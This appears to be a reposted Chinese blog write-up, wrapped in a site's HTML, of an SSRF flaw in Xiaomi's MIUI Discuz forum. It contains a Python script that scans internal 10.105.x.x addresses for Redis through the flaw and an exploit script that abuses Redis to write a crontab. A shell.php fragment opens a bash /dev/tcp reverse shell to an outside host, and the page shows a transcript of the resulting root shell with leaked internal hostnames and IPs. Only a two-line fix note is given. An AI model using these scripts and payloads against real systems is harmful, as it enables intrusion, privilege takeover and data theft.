@@ -1,0 +1,500 @@
+<!doctype html>
+<html lang="en-us">
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+
+    <title>漏洞学习SSRF小米某处SSRF漏洞可内网SHELL附多线程Fuzz脚本 | 开发者问答集锦</title>
+    <meta property="og:title" content="漏洞学习SSRF小米某处SSRF漏洞可内网SHELL附多线程Fuzz脚本 - 开发者问答集锦">
+    <meta property="og:type" content="article">
+        
+    <meta property="article:published_time" content='2020-09-02T00:00:00&#43;08:00'>
+        
+        
+    <meta property="article:modified_time" content='2020-09-02T00:00:00&#43;08:00'>
+        
+    <meta name="Keywords" content="">
+    <meta name="description" content="漏洞学习SSRF小米某处SSRF漏洞可内网SHELL附多线程Fuzz脚本">
+        
+    <meta name="author" content="">
+    <meta property="og:url" content="https://zaina.newban.cn/posts/%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0ssrf%E5%B0%8F%E7%B1%B3%E6%9F%90%E5%A4%84ssrf%E6%BC%8F%E6%B4%9E%E5%8F%AF%E5%86%85%E7%BD%91shell%E9%99%84%E5%A4%9A%E7%BA%BF%E7%A8%8Bfuzz%E8%84%9A%E6%9C%AC/">
+    <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">
+
+    <link rel="stylesheet" href='/css/normalize.css'>
+    <link rel="stylesheet" href='/css/style.css'>
+    <script type="text/javascript" src="//cdn.bootcdn.net/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+
+    
+    
+    
+    
+    
+    
+</head>
+
+
+<body>
+    <header id="header" class="clearfix">
+    <div class="container">
+        <div class="col-group">
+            <div class="site-name ">
+                
+                    <a id="logo" href="https://zaina.newban.cn">
+                        开发者问答集锦
+                    </a>
+                
+                
+            </div>
+            <div>
+                <nav id="nav-menu" class="clearfix">
+                    <a class="" href="https://zaina.newban.cn">首页</a>
+                    
+                </nav>
+            </div>
+        </div>
+    </div>
+</header>
+
+    <div id="body">
+        <div class="container">
+            <div class="col-group">
+
+                <div class="col-8" id="main">
+                    
+<div class="res-cons">
+    
+    <article class="post">
+        <header>
+            <h1 class="post-title">漏洞学习SSRF小米某处SSRF漏洞可内网SHELL附多线程Fuzz脚本</h1>
+        </header>
+        <date class="post-meta meta-date">
+            2020年9月2日
+        </date>
+        
+        
+        <div class="post-meta">
+            <span id="busuanzi_container_page_pv">|<span id="busuanzi_value_page_pv"></span><span>
+                    阅读</span></span>
+        </div>
+        
+        
+        <div class="post-content">
+            
+
+<h3 id="漏洞细节">漏洞细节</h3>
+
+<p>#1 存在漏洞位置，Discuz 论坛SSRF漏洞<br />
+<a href="http://www.miui.com/forum.php?mod=ajax&amp;action=downremoteimg&amp;message=[img]http://fuzz.wuyun.com/302.php?data=helo.jpg[/img">http://www.miui.com/forum.php?mod=ajax&amp;action=downremoteimg&amp;message=[img]http://fuzz.wuyun.com/302.php?data=helo.jpg[/img</a>]<br />
+#2 服务器支持dict、ftp、http协议<br />
+<a href="http://www.miui.com/forum.php?mod=ajax&amp;action=downremoteimg&amp;message=[img]http://fuzz.wuyun.com/302.php?s=dict%26ip=fuzz.wuyun.com%26port=8080%26data=helo.jpg[/img">http://www.miui.com/forum.php?mod=ajax&amp;action=downremoteimg&amp;message=[img]http://fuzz.wuyun.com/302.php?s=dict%26ip=fuzz.wuyun.com%26port=8080%26data=helo.jpg[/img</a>]<br />
+#3 通过信息泄露找到内网地址<br />
+phpinfo() 泄露服务器ip地址<br />
+<a href="http://game.xiaomi.com/activity/info.php">http://game.xiaomi.com/activity/info.php</a></p>
+
+<blockquote>
+<p>_SERVER[&ldquo;SERVER_ADDR&rdquo;] 10.105.44.71<br />
+ _SERVER[&ldquo;SERVER_PORT&rdquo;] 8080<br />
+ _SERVER[&ldquo;SERVER_NAME&rdquo;] g.mi.com<br />
+ _SERVER[&ldquo;REDIRECT_STATUS&rdquo;] 200<br />
+ _SERVER[&ldquo;SCRIPT_FILENAME&rdquo;] /home/work/game.xiaomi.com/activity/info.php<br />
+ _SERVER[&ldquo;HTTP_HOST&rdquo;] game.xiaomi.com</p>
+</blockquote>
+
+<p><a href="https://img.it610.com/image/info8/e2233128fbab4338ace28f8908e83bea.jpg"><img src="https://img.it610.com/image/info8/e2233128fbab4338ace28f8908e83bea.jpg" alt="【漏洞学习——SSRF】小米某处SSRF漏洞\(可内网SHELL
+附多线程Fuzz脚本\)_第1张图片" /></a></p>
+
+<p>#4 内网服务探测规则原理分析<br />
+<a href="http://fuzz.wuyun.com/302.php?url=dict://10.105.44.71:8080">http://fuzz.wuyun.com/302.php?url=dict://10.105.44.71:8080</a><br />
+访问存在开放的8080端口，网页在1s内加载完成<br />
+<a href="http://fuzz.wuyun.com/302.php?url=ftp://10.105.44.71:8080">http://fuzz.wuyun.com/302.php?url=ftp://10.105.44.71:8080</a><br />
+利用ftp协议访问开放的8080端口，网页保持Keep-Alive状态，直到出发nginx的超时<br />
+<a href="http://fuzz.wuyun.com/302.php?url=dict://10.105.44.71:11011">http://fuzz.wuyun.com/302.php?url=dict://10.105.44.71:11011</a><br />
+访问不存在的端口11011，触发了小米nginx的超时, 3.1s内加载完成<br />
+也就是说，我们可以通过页面加载完成时间，来探测内网开放的端口服务</p>
+
+<p>#5 Know it, then Hack it<br />
+通过python的requests，设置一个timeout值，只要http请求2.8秒内没有响应，直接断开，如果成功响应，就说明端口开放</p>
+
+<pre><code>#!/usr/bin/env python
+# encoding: utf-8
+# email: ringzero@0x557.org
+import requests
+import time
+import requests.packages.urllib3
+requests.packages.urllib3.disable_warnings()
+import threading
+import Queue
+threads_count = 20
+scheme = 'dict'
+port = '6379'
+ip_block = '10.105'
+class WyWorker(threading.Thread):
+    def __init__(self,queue):
+        threading.Thread.__init__(self)
+        self.queue = queue
+    def run(self):
+        while True:
+            if self.queue.empty():
+                break
+            try:
+                url = self.queue.get_nowait()
+                content = requests.get(url, timeout=2.8).content
+                print url, 'OPEN', len(content)
+            except requests.exceptions.ReadTimeout:
+                pass
+            except requests.exceptions.ConnectTimeout:
+                pass
+            except Exception, e:
+                break
+queue = Queue.Queue()
+for c in xrange(0,255):
+    for d in xrange(0,255):    
+        ip = '{0}.{1}.{2}'.format(ip_block,c,d)
+        payload = 'http://fuzz.wuyun.com/302.php?s={scheme}%26ip={ip}%26port={port}%26data=helo.jpg'.format(
+            scheme=scheme,
+            ip=ip, 
+            port=port
+            )
+        url = &quot;http://www.miui.com/forum.php?mod=ajax&amp;action=downremoteimg&amp;message=[img]{payload}[/img]&quot;.format(
+            payload=payload)
+        queue.put(url)
+threads = []
+for i in xrange(threads_count):
+    threads.append(WyWorker(queue))
+for t in threads:
+    t.start()
+for t in threads:
+    t.join()
+</code></pre>
+
+<p>#6 6379 端口开放结果</p>
+
+<blockquote>
+<p>lg-sec-weblog01.bj (10.105.0.23)<br />
+ lg-miui-ad-se51.bj (10.105.0.24)<br />
+ lg-im-micloud-pns09.bj (10.105.3.60)<br />
+ lg-im-micloud-pns10.bj (10.105.3.61)<br />
+ lg-im-mipush-xmq74.bj (10.105.3.62)<br />
+ lg-miui-fc-mr02.bj (10.105.3.80)</p>
+
+<p>#7 使用dict协议进行远程利用</p>
+</blockquote>
+
+<pre><code>#!/usr/bin/env python
+# coding=utf-8
+import requests
+host = '10.105.0.23'
+port = '6379'
+bhost = 'fuzz.wuyun.com'
+bport = '443'
+vul_httpurl = 'http://www.miui.com/forum.php?mod=ajax&amp;action=downremoteimg&amp;message=[img]'
+_location = 'http://fuzz.wuyun.com/302.php'
+shell_location = 'http://fuzz.wuyun.com/shell.php'
+#1 flush db
+_payload = '?s=dict%26ip={host}%26port={port}%26data=flushall'.format(
+    host = host,
+    port = port)
+exp_uri = '{vul_httpurl}{0}{1}%23helo.jpg[/img]'.format(_location, _payload, vul_httpurl=vul_httpurl)
+print exp_uri
+print len(requests.get(exp_uri).content)
+#2 set crontab command
+_payload = '?s=dict%26ip={host}%26port={port}%26bhost={bhost}%26bport={bport}'.format(
+    host = host,
+    port = port,
+    bhost = bhost,
+    bport = bport)
+exp_uri = '{vul_httpurl}{0}{1}%23helo.jpg[/img]'.format(shell_location, _payload, vul_httpurl=vul_httpurl)
+print exp_uri
+print len(requests.get(exp_uri).content)
+#3 config set dir /var/spool/cron/
+_payload = '?s=dict%26ip={host}%26port={port}%26data=config:set:dir:/var/spool/cron/'.format(
+    host = host,
+    port = port)
+exp_uri = '{vul_httpurl}{0}{1}%23helo.jpg[/img]'.format(_location, _payload, vul_httpurl=vul_httpurl)
+print exp_uri
+print len(requests.get(exp_uri).content)
+#4 config set dbfilename root
+_payload = '?s=dict%26ip={host}%26port={port}%26data=config:set:dbfilename:root'.format(
+    host = host,
+    port = port)
+exp_uri = '{vul_httpurl}{0}{1}%23helo.jpg[/img]'.format(_location, _payload, vul_httpurl=vul_httpurl)
+print exp_uri
+print len(requests.get(exp_uri).content)
+#5 save to file
+_payload = '?s=dict%26ip={host}%26port={port}%26data=save'.format(
+    host = host,
+    port = port)
+exp_uri = '{vul_httpurl}{0}{1}%23helo.jpg[/img]'.format(_location, _payload, vul_httpurl=vul_httpurl)
+print exp_uri
+print len(requests.get(exp_uri).content)
+</code></pre>
+
+<h1 id="附加补充源码">附加补充源码</h1>
+
+<p>302.php</p>
+
+<p>shell.php</p>
+
+<pre><code>\\x26\\x20/dev/tcp/{$bhost}/{$bport}\\x200&gt;\\x261\\x0a\\x0a\\x0a\&quot;&quot;);
+?&gt;
+</code></pre>
+
+<h1 id="后话-成功获取到shell">后话，成功获取到SHELL</h1>
+
+<pre><code>[root@localhost wyssrf]# nc -l -vv 443
+Connection from 42.62.103.30 port 443 [tcp/https] accepted
+bash: no job control in this shell
+[root@lg-sec-weblog01 ~]# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+[root@lg-sec-weblog01 ~]# /sbin/ifconfig -a
+/sbin/ifconfig -a
+eth0      Link encap:Ethernet  HWaddr EC:F4:BB:C3:EA:10  
+          inet addr:10.105.0.23  Bcast:10.105.0.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:111088533 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:158878520 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:45520794026 (42.3 GiB)  TX bytes:196616141142 (183.1 GiB)
+          Memory:dcb00000-dcc00000 
+eth1      Link encap:Ethernet  HWaddr EC:F4:BB:C3:EA:11  
+          BROADCAST MULTICAST  MTU:1500  Metric:1
+          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:0 (0.0 b)  TX bytes:0 (0.0 b)
+          Memory:dcc00000-dcd00000 
+eth2      Link encap:Ethernet  HWaddr EC:F4:BB:C3:EA:12  
+          BROADCAST MULTICAST  MTU:1500  Metric:1
+          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:0 (0.0 b)  TX bytes:0 (0.0 b)
+          Memory:dcd00000-dce00000 
+eth3      Link encap:Ethernet  HWaddr EC:F4:BB:C3:EA:13  
+          BROADCAST MULTICAST  MTU:1500  Metric:1
+          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:0 (0.0 b)  TX bytes:0 (0.0 b)
+          Memory:dce00000-dcf00000 
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          UP LOOPBACK RUNNING  MTU:16436  Metric:1
+          RX packets:75857851 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:75857851 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:76991909461 (71.7 GiB)  TX bytes:76991909461 (71.7 GiB)
+[root@lg-sec-weblog01 ~]# last -20
+last -20
+root     pts/0        10.21.100.82     Sat Oct  3 16:31 - 05:01  (12:29)    
+root     pts/0        10.21.100.82     Tue Sep 22 14:49 - 14:49  (00:00)    
+root     pts/0        10.21.100.81     Fri Sep 18 16:52 - 05:01  (12:08)    
+root     pts/0        10.200.100.33    Wed Sep  2 12:23 - 15:21  (02:58)    
+root     pts/0        10.200.100.33    Wed Sep  2 12:06 - 12:07  (00:01)    
+root     pts/0        10.21.100.81     Tue Sep  1 10:45 - 11:20  (00:35)    
+root     pts/0        10.200.100.33    Wed Aug 26 11:30 - 15:26  (03:56)    
+root     pts/1        10.21.100.82     Fri Aug 21 04:19 - 05:01  (00:41)    
+root     pts/0        10.21.100.82     Thu Aug 20 11:30 - 05:01  (17:30)    
+root     pts/0        10.21.100.82     Wed Aug 19 11:14 - 05:01  (17:46)    
+root     pts/0        10.21.100.82     Fri Aug 14 10:48 - 05:01  (18:12)    
+root     pts/0        10.21.100.82     Mon Aug 10 09:00 - 05:01  (20:00)    
+root     pts/0        10.21.100.82     Sun Aug  9 20:24 - 05:01  (08:36)    
+root     pts/1        10.200.100.33    Fri Aug  7 10:48 - 14:49  (04:00)    
+root     pts/0        10.21.100.82     Fri Aug  7 09:19 - 05:01  (19:41)    
+root     pts/0        10.21.100.82     Thu Aug  6 09:05 - 05:01  (19:55)    
+root     pts/0        10.21.100.82     Wed Jul 29 10:32 - 05:01  (18:28)    
+root     pts/0        10.21.100.82     Tue Jul 28 20:33 - 05:01  (08:27)    
+root     pts/0        10.21.100.82     Tue Jul 28 15:51 - 20:33  (04:42)    
+root     pts/0        10.21.100.82     Tue Jul 28 15:50 - 15:51  (00:00)    
+wtmp begins Fri Apr 10 14:00:41 2015
+[root@lg-sec-weblog01 ~]# rm /var/spool/cron/root
+rm /var/spool/cron/root
+[root@lg-sec-weblog01 ~]#
+</code></pre>
+
+<h3 id="修复建议">修复建议</h3>
+
+<p>#1 更新补丁<br />
+#2 SSRF所在服务器，iptables禁止访问内网资源</p>
+
+        </div>
+
+        
+
+
+        
+
+<div class="post-archive">
+    <h2>See Also</h2>
+    <ul class="listing">
+        
+        <li><a href="/posts/007hadoop%E9%9B%86%E7%BE%A4%E9%85%8D%E7%BD%AEhadoop%E9%9B%86%E7%BE%A4%E7%9A%84%E5%90%AF%E5%8A%A8%E5%92%8C%E6%B5%8B%E8%AF%95ssh%E5%85%8D%E7%99%BB%E9%99%86%E9%85%8D%E7%BD%AEstartallshhdfs%E5%B8%B8%E7%94%A8%E7%9A%84shell/">007Hadoop集群配置Hadoop集群的启动和测试SSH免登陆配置startallshhdfs常用的shell</a></li>
+        
+        <li><a href="/posts/009shell%E8%84%9A%E6%9C%AC%E4%B8%8B%E6%9D%A1%E4%BB%B6%E6%B5%8B%E8%AF%95eqne/">009Shell脚本下条件测试eqne</a></li>
+        
+        <li><a href="/posts/00pythonmanagepyshell%E5%92%8Cpython%E7%9A%84%E5%88%86%E6%9E%90/">00Pythonmanagepyshell和Python的分析</a></li>
+        
+        <li><a href="/posts/010zookeeper%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5zookeeper%E7%9A%84%E9%9B%86%E7%BE%A4%E6%90%AD%E5%BB%BAzookeeper%E7%9A%84shell%E5%91%BD%E4%BB%A4/">010Zookeeper的基本概念Zookeeper的集群搭建Zookeeper的shell命令</a></li>
+        
+        <li><a href="/posts/018dockerfileshell/">018DockerfileSHELL</a></li>
+        
+    </ul>
+</div>
+
+
+        <div class="post-meta meta-tags">
+            
+            <ul class="clearfix">
+                
+                <li><a href='https://zaina.newban.cn/tags/shell'>shell</a></li>
+                
+            </ul>
+            
+        </div>
+    </article>
+    
+    
+
+    
+    
+</div>
+
+                    <footer id="footer">
+    <div>
+        &copy; 2020 <a href="https://zaina.newban.cn">开发者问答集锦 By </a>
+        
+    </div>
+    <br />
+    <div>
+        <div class="github-badge">
+            <a href="https://gohugo.io/" target="_black" rel="nofollow"><span class="badge-subject">Powered by</span><span class="badge-value bg-blue">Hugo</span></a>
+        </div>
+        <div class="github-badge">
+            <a href="https://www.flysnow.org/" target="_black"><span class="badge-subject">Design by</span><span class="badge-value bg-brightgreen">飞雪无情</span></a>
+        </div>
+        <div class="github-badge">
+            <a href="https://github.com/flysnow-org/maupassant-hugo" target="_black"><span class="badge-subject">Theme</span><span class="badge-value bg-yellowgreen">Maupassant</span></a>
+        </div>
+    </div>
+</footer>
+
+
+    
+    <script type="text/javascript">
+        window.MathJax = {
+            tex2jax: {
+                inlineMath: [['$', '$']],
+                processEscapes: true
+                }
+            };
+    </script>
+    <script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML' async></script>
+
+<a id="rocket" href="#top"></a>
+<script type="text/javascript" src='/js/totop.js?v=0.0.0' async=""></script>
+
+
+
+    <script type="text/javascript" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+
+
+
+
+                </div>
+
+                <div id="secondary">
+    <section class="widget">
+        <form id="search" action='https://zaina.newban.cn/search/' method="get" accept-charset="utf-8" target="_blank" _lpchecked="1">
+      
+      <input type="text" name="q" maxlength="20" placeholder="Search">
+      <input type="hidden" name="sitesearch" value="https://zaina.newban.cn">
+      <button type="submit" class="submit icon-search"></button>
+</form>
+    </section>
+    
+    <section class="widget">
+        <h3 class="widget-title">最近文章</h3>
+<ul class="widget-list">
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/001rubyruby%E4%B8%AD%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E5%AE%9E%E4%BE%8B%E5%8F%98%E9%87%8F%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E7%B1%BB%E5%8F%98%E9%87%8Fsymbol%E5%AF%B9%E6%AF%94/" title="001rubyRuby中全局变量实例变量局部变量类变量Symbol对比">001rubyRuby中全局变量实例变量局部变量类变量Symbol对比</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/007hadoop%E9%9B%86%E7%BE%A4%E9%85%8D%E7%BD%AEhadoop%E9%9B%86%E7%BE%A4%E7%9A%84%E5%90%AF%E5%8A%A8%E5%92%8C%E6%B5%8B%E8%AF%95ssh%E5%85%8D%E7%99%BB%E9%99%86%E9%85%8D%E7%BD%AEstartallshhdfs%E5%B8%B8%E7%94%A8%E7%9A%84shell/" title="007Hadoop集群配置Hadoop集群的启动和测试SSH免登陆配置startallshhdfs常用的shell">007Hadoop集群配置Hadoop集群的启动和测试SSH免登陆配置startallshhdfs常用的shell</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/009shell%E8%84%9A%E6%9C%AC%E4%B8%8B%E6%9D%A1%E4%BB%B6%E6%B5%8B%E8%AF%95eqne/" title="009Shell脚本下条件测试eqne">009Shell脚本下条件测试eqne</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/00pythonmanagepyshell%E5%92%8Cpython%E7%9A%84%E5%88%86%E6%9E%90/" title="00Pythonmanagepyshell和Python的分析">00Pythonmanagepyshell和Python的分析</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/010zookeeper%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5zookeeper%E7%9A%84%E9%9B%86%E7%BE%A4%E6%90%AD%E5%BB%BAzookeeper%E7%9A%84shell%E5%91%BD%E4%BB%A4/" title="010Zookeeper的基本概念Zookeeper的集群搭建Zookeeper的shell命令">010Zookeeper的基本概念Zookeeper的集群搭建Zookeeper的shell命令</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/018dockerfileshell/" title="018DockerfileSHELL">018DockerfileSHELL</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/01shell%E5%85%A5%E9%97%A801bashshell%E7%89%B9%E6%80%A7/" title="01Shell入门01bashShell特性">01Shell入门01bashShell特性</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/01shell%E5%8F%98%E9%87%8F/" title="01Shell变量">01Shell变量</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/01shell%E5%9F%BA%E7%A1%80%E6%A6%82%E8%BF%B0%E8%84%9A%E6%9C%AC%E6%89%A7%E8%A1%8C%E6%96%B9%E5%BC%8Fbash%E5%9F%BA%E6%9C%AC%E5%8A%9F%E8%83%BD/" title="01Shell基础概述脚本执行方式Bash基本功能">01Shell基础概述脚本执行方式Bash基本功能</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/01shell%E7%BC%96%E7%A8%8Bhelloworld/" title="01shell编程helloworld">01shell编程helloworld</a>
+    </li>
+    
+</ul>
+    </section>
+
+    
+
+    <section class="widget">
+        <h3 class="widget-title"><a href="/categories">分类</a></h3>
+<ul class="widget-list">
+    
+</ul>
+    </section>
+
+    <section class="widget">
+        <h3 class="widget-title"><a href="/tags">标签</a></h3>
+<div class="tagcloud">
+    
+    <a href="https://zaina.newban.cn/tags/ruby/">ruby</a>
+    
+    <a href="https://zaina.newban.cn/tags/shell/">shell</a>
+    
+</div>
+    </section>
+
+    
+
+    <section class="widget">
+        <h3 class="widget-title">其它</h3>
+        <ul class="widget-list">
+            <li><a href="https://zaina.newban.cn/index.xml">文章 RSS</a></li>
+        </ul>
+    </section>
+</div>
+            </div>
+        </div>
+    </div>
+</body>
+
+</html>
